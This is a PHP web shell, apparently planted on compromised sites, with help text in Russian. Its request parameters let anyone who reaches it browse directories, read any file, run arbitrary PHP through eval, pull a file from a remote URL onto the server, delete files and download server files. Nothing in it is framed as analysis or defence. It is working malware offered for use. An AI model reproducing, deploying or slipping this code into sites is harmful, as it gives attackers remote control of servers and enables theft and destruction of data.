<?php

if(isset($_REQUEST['dir'])){ 
$where = ($_REQUEST['dir']);
echo "<pre>"; echo "start dir: \n" . __DIR__; echo "</pre>";
if(file_exists("$where") == true){
echo "<pre>"; echo "we are in: \n" . $where; 

if ( ! is_writable($where)) {
    echo "<pre>"; echo "writable: not"; echo "</pre>";
} else {
    echo "<pre>"; echo "writable: yes"; echo "</pre>";
}

$dir = scandir($where);
echo "<pre>"; foreach ($dir as $fn) {echo $fn . "\n";}echo "</pre>";
}else{
echo "<pre>"; echo "Cant access " . $where; 
}
}

if(isset($_REQUEST['read'])){ 
$what = ($_REQUEST['read']);
if(file_exists("$what") == true) {echo "<pre>"; echo file_get_contents("$what");}else{echo "<pre>"; echo "[404] cant find: \n" . $what;}
}

if(isset($_REQUEST['eval'])){ 
$cmd = ($_REQUEST['eval']);
echo "<pre>"; @eval($cmd); echo "</pre>";
}

if(isset($_REQUEST['ping'])){ 
$ping = ($_REQUEST['ping']);
echo ping;
}

if(isset($_REQUEST['upload'])){ 
$upload = ($_REQUEST['upload']);
echo uploading;
file_put_contents(basename($upload), fopen("$upload", 'r'));
}

if(isset($_REQUEST['del'])){ 
$delete = ($_REQUEST['del']);
echo deleting;
unlink("$delete");
}

if(isset($_REQUEST['download'])){ 
$download = ($_REQUEST['download']);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($download));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($download));
    readfile($download);
}

if(isset($_REQUEST['stat'])){ 
$stat = ($_REQUEST['stat']);
if(file_exists("$stat") == true){
$full = stat("$stat");
if (!$full) {
    echo 'Невозможно прочитать данные';
}else {
echo "<pre>"; echo "Информация о файле " . $stat;
echo "<pre>"; echo 'Вес: ' . $full['size'] . "\n" . 'Последний доступ: ' . gmdate("Y/m/d H:i:s", $full['atime']) . "\n" . "Модифицировано: ". gmdate("Y/m/d H:i:s", $full['mtime']) . "\n" . 'Ссылок: ' . $full['nlink'];
}
}else{
echo 'Файл не найден';
}
}

if(isset($_REQUEST['h'])){ 
echo "<pre>"; echo "Короче. \n\n dir - путешествие по папкам \n read - чтение файлов \n eval - выполнение PHP кода \n upload - загрузка файлов по ссылке в __DIR__  \n del - удаление файлов \n download - скачивание файла с сервера \n stat - информация о файле (вес, последний доступ, кода модифицировано и сколько ссылок)";
}
